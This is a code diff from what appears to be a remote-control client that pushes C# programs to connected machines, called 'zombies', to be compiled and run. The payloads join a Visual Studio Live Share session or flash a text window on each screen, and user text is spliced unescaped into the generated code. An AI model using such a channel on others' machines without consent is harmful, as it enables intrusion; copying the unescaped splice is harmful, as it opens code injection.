@@ -32,6 +32,7 @@ namespace FirebridgeClient.Controls
             CodeEditor.Dispose();
         }
 
+        /*
         private void _identifyPC_Click(object sender, EventArgs e)
         {
             foreach (var zombie in zombieViews)
@@ -183,7 +184,6 @@ namespace FirebridgeClient.Controls
                 return;
 
             string txt = messageBox._vslink.Text;
-
             var code = txt.Split('?');
 
             foreach (var zombie in zombieViews)
@@ -193,7 +193,7 @@ namespace FirebridgeClient.Controls
                     Id = 1,
                     Data = new MiniProgramModel()
                     {
-                        Code = "using System.Diagnostics; \r\nusing System.Text.RegularExpressions; \r\nusing System;\r\nusing System.Diagnostics;\r\nusing System.Linq;\r\nusing FirebridgeShared.Networking;\r\n\r\nnamespace TestApp\r\n{\r\n    public static class Program\r\n    {\r\n        public static void Main(Connection s)\r\n        {\r\n            Process p = new Process();\r\n            \r\n            p.StartInfo.FileName = Environment.ExpandEnvironmentVariables(\"%ProgramFiles(x86)%\\\\Microsoft Visual Studio\\\\Installer\\\\vswhere.exe\");\r\n            p.StartInfo.UseShellExecute = false;\r\n            p.StartInfo.RedirectStandardOutput = true;\r\n            p.Start();\r\n\r\n            string output = p.StandardOutput.ReadToEnd();\r\n            p.WaitForExit();\r\n\r\n            string vspath = Regex.Match(output, @\"installationPath:(.*)\").Groups[1].Value;\r\n            vspath = vspath.Replace(\"\\r\", \"\");\r\n            string installPath = vspath + \"\\\\Common7\\\\IDE\\\\\";\r\n\r\n            string vs = \"devenv.exe\";\r\n\r\n            p = new Process();\r\n\r\n            p.StartInfo.UseShellExecute = true;\r\n            p.StartInfo.WorkingDirectory = installPath;\r\n            p.StartInfo.FileName = vs;\r\n            p.StartInfo.Arguments = \"/client /joinworkspace \\\"vsls:?action=join&workspaceId="
+                        Code = "using System.Diagnostics; \r\nusing System.Text.RegularExpressions; \r\nusing System;\r\nusing System.Diagnostics;\r\nusing System.Linq;\r\nusing FirebridgeShared.Networking;\r\n\r\nnamespace TestApp\r\n{\r\n    public static class Program\r\n    {\r\n        public static void Main(Connection s)\r\n        {\r\n            Process p = new Process();\r\n            \r\n            p.StartInfo.FileName = Environment.ExpandEnvironmentVariables(\"%ProgramFiles(x86)%\\\\Microsoft Visual Studio\\\\Installer\\\\vswhere.exe\");\r\n            p.StartInfo.UseShellExecute = false;\r\n            p.StartInfo.RedirectStandardOutput = true;\r\n            p.Start();\r\n\r\n            string output = p.StandardOutput.ReadToEnd();\r\n            p.WaitForExit();\r\n\r\n            string vspath = Regex.Match(output, @\"installationPath:(.*)\").Groups[1].Value;\r\n            vspath = vspath.Replace(\"\\r\", \"\");\r\n            string installPath = vspath + \"\\\\Common7\\\\IDE\\\\\";\r\n\r\n            string vs = \"devenv.exe\";\r\n\r\n            p = new Process();\r\n\r\n            p.StartInfo.WorkingDirectory = installPath.Trim();\r\n            p.StartInfo.FileName = vs;\r\n            p.StartInfo.Arguments = \"/joinworkspace \\\"vsls:?action=join&workspaceId="
                         + code.Last()
                         + "&correlationId=null\\\"\";\r\n            p.Start();\r\n        }\r\n    }\r\n}\r\n",
                         EntryPoint = "TestApp.Program",
@@ -205,5 +205,70 @@ namespace FirebridgeClient.Controls
                 });
             }
         }
+
+        private void _sendText_Click(object sender, EventArgs e)
+        {
+            textMessageBox messageBox = new textMessageBox();
+            messageBox.ShowDialog();
+            if (!messageBox.Success)
+                return;
+
+            string txt = messageBox._vslink.Text;
+
+            foreach (var zombie in zombieViews)
+            {
+                zombie.SendPacket(new Packet()
+                {
+                    Id = 1,
+                    Data = new MiniProgramModel()
+                    {
+                        Code = @"   using System;
+                                    using System.Drawing;
+                                    using System.Threading;
+                                    using System.Windows.Forms;
+                                    using FirebridgeShared.Networking;
+                                    using System.Threading.Tasks;
+
+                                    namespace TestApp
+                                    {
+                                        public static class Program
+                                        {
+                                            public static void Main(Connection s)
+                                            {
+                                            Task.Run(() =>
+                                            {
+                                                var form = new Form();
+                                                form.TopMost = true;
+                                                form.FormBorderStyle = FormBorderStyle.None;
+                                                form.AutoSize = true;
+                                                form.TopLevel = true;
+                                                Label label = new Label();
+                                                label.Text = """ + txt+ @""";
+                                                label.AutoSize = true;
+
+                                                label.Font = new Font(""Microsoft Sans Serif"", 30F, FontStyle.Regular, GraphicsUnit.Point, 238);
+                                                form.Controls.Add(label);
+                                                form.Show();
+                                                form.BringToFront();
+                                                form.TopMost = true;
+                                                form.TopLevel = true;
+                                                label.Location = new Point(10, 10);
+                                                form.Refresh();
+                                                Thread.Sleep(2000); form.Dispose();
+                                            });
+                                        }
+                                        }
+                                    }",
+                        EntryPoint = "TestApp.Program",
+                        References = new List<string>()
+                    {
+                        "System.dll", "FirebridgeShared.dll", "netstandard.dll","System.Core.dll","System.Drawing.dll","System.Windows.Forms.dll"
+                    },
+                    }
+                });
+
+            }
+    }
+                */
     }
 }
